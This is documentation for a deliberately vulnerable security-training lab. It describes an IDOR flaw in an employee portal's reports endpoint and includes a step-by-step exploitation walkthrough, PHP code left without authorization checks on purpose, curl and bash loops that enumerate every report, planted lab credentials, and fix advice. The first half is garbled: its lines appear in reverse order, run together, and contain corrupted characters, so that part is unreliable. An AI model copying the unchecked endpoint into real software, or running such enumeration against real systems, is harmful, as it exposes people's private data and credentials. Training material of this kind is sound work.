# IDOR Vulnerability Documentation








































































































































































The IDOR vulnerability is fully functional with URL-based exploitation!**Current Status**: ‚úÖ **VULNERABLE - READY FOR TRAINING**---5. ‚úÖ Demonstrate IDOR concept clearly4. ‚úÖ Extract dev subdomain credentials3. ‚úÖ Access confidential report #5022. ‚úÖ View reports you don't own1. ‚úÖ Access report by changing URL parameterThe vulnerability is successfully exploited when:## üéØ Success Criteria- [x] Total 512 reports available for enumeration- [x] Report #502 contains dev credentials- [x] Previous/Next buttons work for enumeration- [x] Can access confidential reports- [x] No authorization check on API endpoint- [x] Can change report_id to view other reports- [x] Reports accessible via URL parameter## üìä Testing Checklist```]);    "ip" => $_SERVER['REMOTE_ADDR']    "timestamp" => time(),    "report_id" => $report_id,    "user" => $_SESSION['employee_id'],audit_log("report_access", [// Log all report access```php### 4. Add Proper Logging- Alert on rapid enumeration attempts- Log suspicious access patterns- Limit report access to 10 per minute per user### 3. Implement Rate Limiting```UPDATE weekly_reports SET report_uuid = UUID();ALTER TABLE weekly_reports ADD COLUMN report_uuid VARCHAR(36);-- Instead of auto-incrementing integers, use UUIDs```sql### 2. Use Non-Sequential IDs```");    )        ? IN (SELECT manager_id FROM employees WHERE employee_id = ?)  -- Manager access        is_confidential = FALSE OR   -- Non-confidential reports        employee_id = ? OR           -- User's own report    WHERE id = ? AND (    SELECT * FROM weekly_reports $stmt = $conn->prepare("// Check if user has permission to view this report```php### 1. Implement Authorization## üõ°Ô∏è How to Fix- **ISO 27001**: Information security policy violations- **SOC 2**: Failed access control requirements- **GDPR**: Unauthorized access to personal data### Compliance Issues:- **Privacy Violation**: Can read all 512 reports (personal information)- **Lateral Movement**: Dev credentials often work in other environments- **Data Breach**: Access to source code, databases, customer test data- **Credential Theft**: Admin access to dev.mbti.local### Immediate Risks:## üî¥ Business Impact"I now have admin access to the development environment!"### 6. Exploitation Complete- Full access instructions!"- Admin credentials- Dev subdomain URL (dev.mbti.local)"Report #502 is marked CONFIDENTIAL and contains:### 5. Target IdentifiedMost recent reports (500+) are more likely to have current credentials.""Let me go backwards from 512 to 1 to find interesting reports.### 4. Enumeration‚Üí It works! I can see report #509 now.""What if I manually change `report_id=510` to `report_id=509`?### 3. HypothesisInteresting! The ID is in the URL!"`http://portal.mbti.local/reports?report_id=510`"When I click 'View' on report #510, the URL becomes:### 2. Pattern Recognition"I'm logged in as a junior developer. Let me check the Reports section."### 1. Initial Recon## üîç Discovery Process (Attacker's Perspective)- **Report #512** also contains sensitive executive information- **Report #502** is marked CONFIDENTIAL but accessible to anyone- **Reports 501-512** are most recent (higher chance of sensitive data)- **512 total reports** in the system### Attack Surface:5. **Direct Object Reference**: `report_id` directly maps to database ID4. **Client-Side Only**: "Previous/Next" buttons hint at the pattern3. **No Rate Limiting**: Can rapidly enumerate all reports2. **Predictable IDs**: Sequential numbers (1, 2, 3...) make enumeration trivial1. **No Authorization Check**: API doesn't verify if user owns the report### Missing Security Controls:## üéì Why This Works```Password: Mb7i_D3v_2024!SecureUsername: adminDevelopment Subdomain: http://dev.mbti.local```In report #502, find:### Step 5: Extract Credentials4. üí• Report #502 found!3. Count backwards: 512 ‚Üí 511 ‚Üí 510 ‚Üí ... ‚Üí 5022. Click "Previous Report" button repeatedly1. View report #512 (most recent)**Method B - Navigation Buttons:**```http://portal.mbti.local/reports?report_id=502  ‚Üê üí• TARGET!...http://portal.mbti.local/reports?report_id=510  ‚Üê Keep going back...http://portal.mbti.local/reports?report_id=511  ‚Üê Click "Previous Report"http://portal.mbti.local/reports?report_id=512  ‚Üê Start here```Manually change the URL in your browser:**Method A - URL Manipulation:**### Step 4: Exploit IDOR Vulnerability**Notice the URL changes to**: `http://portal.mbti.local/reports?report_id=XXX`Click "View" on any report in the list### Step 3: View Any ReportClick "Reports" in the left sidebar (briefcase icon)### Step 2: Navigate to Reports```Password: tekelomuxoLogin: MBTI2024837URL: http://portal.mbti.local```### Step 1: Access the Portal## üöÄ Step-by-Step Exploitation**Endpoint**: `http://portal.mbti.local/reports?report_id=XXX`**Vulnerable Parameter**: `report_id` in URL## üìç Vulnerability LocationExploit the IDOR vulnerability in the Reports module to access confidential report #502 containing dev subdomain credentials.## üéØ Objective## Overview
The Employee Portal contains an **Insecure Direct Object Reference (IDOR)** vulnerability in the Reports module that allows unauthorized access to confidential reports.

## Vulnerability Details

### Location
- **Vulnerable Endpoint**: `/api/reports.php`
- **Affected Page**: Reports section in the portal
- **Vulnerability Type**: IDOR (Insecure Direct Object Reference)

### Description
The reports API endpoint allows users to access ANY report by simply providing the report ID in the URL, without proper authorization checks. This means:

1. **No Authentication Required**: The API doesn't verify if the user is logged in
2. **No Authorization Check**: The API doesn't verify if the user has permission to view the specific report
3. **Sequential IDs**: Report IDs are sequential (1-512), making it easy to enumerate all reports
4. **Confidential Data Exposure**: Confidential reports marked with `is_confidential = TRUE` are fully accessible

### Vulnerable Code
```php
// VULNERABILITY: IDOR - No access control! Anyone can view any report by guessing the ID
if ($method === 'GET' && isset($_GET['id'])) {
    $report_id = intval($_GET['id']);
    
    // VULNERABILITY: Direct object reference with no authorization check
    $stmt = $conn->prepare("
        SELECT id, employee_id, employee_name, report_title, report_content,
               is_confidential, submitted_at, status, reviewed_at
        FROM weekly_reports 
        WHERE id = ?
    ");
    $stmt->bind_param("i", $report_id);
    $stmt->execute();
    $result = $stmt->get_result();
    
    // Return full report content - NO ACCESS CONTROL!
    echo json_encode([...]);
}
```

## Exploitation

### Method 1: URL Parameter Manipulation (Primary IDOR)
The main IDOR vulnerability is in the URL parameter. Simply change the `report_id` parameter:

```bash
# View report 512
http://portal.mbti.local/reports?report_id=512

# Navigate backwards to find confidential reports
http://portal.mbti.local/reports?report_id=511
http://portal.mbti.local/reports?report_id=510
...
http://portal.mbti.local/reports?report_id=502  # ‚Üê DEV CREDENTIALS HERE!
```

**Attack Pattern:**
1. Login to portal and click on any report
2. Notice URL format: `http://portal.mbti.local/reports?report_id=XXX`
3. Change the number in the URL to access other reports
4. Use "Previous Report" / "Next Report" buttons to navigate
5. Report #502 contains dev subdomain credentials!

### Method 2: Direct API Access
Access any report directly via API (no authentication required):
```bash
curl "http://portal.mbti.local/api/reports.php?id=502"
curl "http://portal.mbti.local/api/reports.php?id=512"
```

### Method 3: Automated Enumeration
Loop through all report IDs to download all reports:
```bash
for i in {1..512}; do
  curl "http://portal.mbti.local/api/reports.php?id=$i" -o "report_$i.json"
done
```

## Confidential Data Exposed

### Report #502 - Infrastructure Access Credentials ‚ö†Ô∏è PRIMARY TARGET
- **Employee**: Peter Schneider (MBTI2024837)
- **Title**: Infrastructure Access Credentials
- **URL**: `http://portal.mbti.local/reports?report_id=502`
- **Leaked Data**:
  - **Development Subdomain**: http://dev.mbti.local
  - Development Server: dev.mbti-internal.local
  - Username: admin
  - **Password: Mb7i_D3v_2024!Secure**
  - Full admin access to dev environment

### Report #512 - Executive Financial Summary
- **Employee**: Klaus Weber (MBTI2024999)
- **Title**: Executive Summary - Q4 Financial Overview
- **Leaked Data**:
  - Executive salaries and bonuses
  - Database credentials:
    - Username: db_admin
    - **Password: Pr0d_DB_M8t1#2025!Secure**
  - Confidential layoff plans
  - Secret merger negotiations

## Impact
- **Confidentiality Breach**: Unauthorized access to sensitive business data
- **Credential Exposure**: Production database and server credentials leaked
- **Privacy Violation**: Employee salary information exposed
- **Competitive Intelligence**: Merger and acquisition plans revealed
- **Legal/Compliance Issues**: Potential GDPR violations

## Total Reports in System
- **Total Reports**: 512
- **Non-Confidential**: 510 reports
- **Confidential**: 2 reports (IDs: 502, 512)

## Hints for Testing
The UI provides helpful hints:
- "Hint: Reports are numbered sequentially (1-512)"
- Reports around ID 500+ contain more detailed/sensitive information
- Look for reports marked with red "CONFIDENTIAL" badges

## Expected Behavior (Secure Implementation)
A secure implementation should:
1. Require user authentication (session validation)
2. Check if the user has permission to view the specific report
3. Only allow users to view their own reports or reports they manage
4. Use non-sequential, unpredictable identifiers (UUIDs)
5. Implement rate limiting to prevent enumeration
6. Log all access attempts for audit purposes

## Testing Credentials
- **Username**: MBTI2024837
- **Password**: tekelomuxo
- **User**: Peter Schneider (Junior Security Developer)

Note: This is a deliberately vulnerable lab environment for security training purposes.
